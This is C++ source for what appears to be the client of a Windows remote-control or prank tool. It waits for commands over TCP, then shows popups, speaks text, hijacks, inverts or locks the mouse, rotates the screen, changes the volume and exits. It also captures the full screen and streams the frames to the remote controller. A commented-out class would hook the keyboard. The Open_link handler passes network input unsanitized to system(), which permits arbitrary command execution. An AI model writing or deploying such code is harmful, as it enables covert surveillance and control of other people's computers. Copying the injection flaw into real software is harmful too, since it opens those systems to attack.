#include <asio.hpp>
#include "stupid_windows.h"
#include <string>
#include <thread>
#include <map>
#include <iostream>
#include <stdlib.h>
#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"
#include "../../packet.h"
using asio::ip::tcp;

class Packet_Manager {
    private:
    public:
        static int packetid;
        static std::map<int, Packet_Manager*> Every_Package;
        Packet_Manager() {
            Every_Package[packetid++] = this;
        }
        virtual void receive(const Packet& packet) {//std::cout << "This packet cannot receive\n";
        }
        virtual void send(tcp::socket &socket, Packet& packet) {//std::cout << "This packet cannot send\n";
        }
};
int Packet_Manager::packetid = 0;
std::map<int, Packet_Manager*> Packet_Manager::Every_Package;
class Get_data : public Packet_Manager {
    void send(tcp::socket &socket, Packet& packet) override {
        if (packet.id == packet_id::GET_DATA) {
            Packet alive_packet{};
            alive_packet.id = packet_id::GET_DATA;
            alive_packet.number = 1;
            asio::write(socket, asio::buffer(&alive_packet, sizeof(alive_packet)));
        }
    }
};
class Popup : public Packet_Manager {
    void receive(const Packet& packet) override {
        show_popup(packet.str);
    }
};
class Open_link : public Packet_Manager {
    void receive(const Packet &packet) override {
        std::string url = std::string(packet.str);
        std::string command = "start " + url;
        system(command.c_str());
    }
};
class tts : public Packet_Manager {
    void receive(const Packet &packet) override {
        ISpVoice* pVoice = nullptr;
         if (FAILED(::CoInitialize(NULL))) {
             std::cerr << "Failed to initialize COM\n";
             return;
         }

         HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
         if (SUCCEEDED(hr)) {
             wchar_t wmsg[256];
             MultiByteToWideChar(CP_UTF8, 0, packet.str, -1, wmsg, 256);
             pVoice->Speak(wmsg, 0, NULL);
             pVoice->Release();
         } else {
             std::cerr << "Failed to create SAPI voice\n";
         }

         ::CoUninitialize();                     
    }       
};

class curser_pos : public Packet_Manager {
    void receive(const Packet &packet) override {
        SetCursorPos(packet.x,packet.y);
    }
};

class random_mouse_move : public Packet_Manager {
    public:
    bool state = false;
    std::thread mouse_move_thread;
    void random_move() {
        while(true) {
            if(state) {
                POINT p;
                GetCursorPos(&p);
                int move_range = 20;
                p.x += random_in_range(-move_range, move_range);
                p.y += random_in_range(-move_range, move_range);
                SetCursorPos(p.x,p.y);
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            } else {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }
        }
    }
    random_mouse_move() {
        mouse_move_thread = std::thread([this](){
            random_move();
        });

        mouse_move_thread.detach();
    }

    void receive(const Packet &packet) override {
        state = packet.bo;
    }
};

class invert_mouse: public Packet_Manager {
    public:
    bool state = false;
    std::thread mouse_move_thread;
    void invert() {
        POINT prevPos, currPos;
        GetCursorPos(&prevPos);

        while (true) {
            if (state) {
                GetCursorPos(&currPos);
                int deltaX = currPos.x - prevPos.x;
                int deltaY = currPos.y - prevPos.y;

                // Invert movement
                int newX = currPos.x - 2 * deltaX;
                int newY = currPos.y - 2 * deltaY;

                SetCursorPos(newX, newY);

                prevPos.x = newX;
                prevPos.y = newY;
            } else {
                GetCursorPos(&prevPos); // Reset when inactive
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(1)); // Prevent CPU thrashing
        }
}
    invert_mouse() {
        mouse_move_thread = std::thread([this](){
            invert();
        });

        mouse_move_thread.detach();
    }

    void receive(const Packet &packet) override {
        state = packet.bo;
    }
};
class lock_mouse_to_box : public Packet_Manager {
    void receive(const Packet &packet) override {
        SetCursorPos((packet.x + packet.size_x) / 2,(packet.y + packet.size_y) / 2);
        lockMouseToBox(packet.x,packet.y,packet.size_x,packet.size_y);
    }
};

class free_mouse : public Packet_Manager {
    void receive(const Packet &packet) override {
        free_locked_mouse();
    }
};

class get_video_frame : public Packet_Manager {
    void send(tcp::socket &socket, Packet &packet) override {
        try {
            int width, height, channels;
            unsigned char* data;
            captureScreenRGBA(data, width, height, channels);
            size_t size = width * height * 4; // RGBA = 4 channels
        
            int image_size = width * height * 4;

            int width_net = htonl(width);
            int height_net = htonl(height);
            size_t size_net = htonl(size);
            try {
                asio::write(socket, asio::buffer(&width_net, sizeof(width_net)));
                asio::write(socket, asio::buffer(&height_net, sizeof(height_net)));
                asio::write(socket, asio::buffer(&size_net, sizeof(size_net)));
                
                asio::write(socket, asio::buffer(data, image_size));
            } catch(const std::exception e) {
                std::cout << e.what() << "\n";
                std::cout << "failed to send frame\n";
                return;
            }
        } catch (const std::exception& e) {
            std::cerr << "Exception in get_video_frame::send: " << e.what() << '\n';
        }
    }
};

// class keyboard_type : public Packet_Manager
// {
//     void receive(const Packet& packet) override
//     {
//         Sleep(500);
//         type_string(packet.str);
//     }
// };

// class echo_keyboard : public Packet_Manager {
// public:
//     bool state = false;
//     std::thread worker;
//     HHOOK hHook = nullptr;
// 
//     echo_keyboard() {
//         worker = std::thread([this]{ loop(); });
//         worker.detach();
//     }
// 
//     void loop()
//     {
//         hHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
//         if (!hHook) {
//             std::cerr << "Failed to set hook!\n";
//             return;
//         }
// 
//         MSG msg;
//         while (GetMessage(&msg, nullptr, 0, 0) > 0)
//         {
//             TranslateMessage(&msg);
//             DispatchMessage(&msg);
// 
//             if (!state) continue;                 
// 
//             std::u16string glyph;
//             if (msgToUtf16(msg, glyph))          
//                 type_string(glyph);             
//         }
// 
//         UnhookWindowsHookEx(hHook);
//     }
// 
//     void receive(const Packet& p) override { state = p.bo; }
// };


class rotate_screen : public Packet_Manager {
    void receive(const Packet &packet) override {
        RotatePrimaryMonitor(packet.number);
    }
};

class dead_class : Packet_Manager {}; 
class system_volume : Packet_Manager {
    void receive(const Packet &packet) override {
        float real_volume = (float)packet.number / 100;

        SetMasterVolume(real_volume);
    }
};

class kill : Packet_Manager {
    void receive(const Packet &packet) override {
        exit(EXIT_SUCCESS);
    }
};
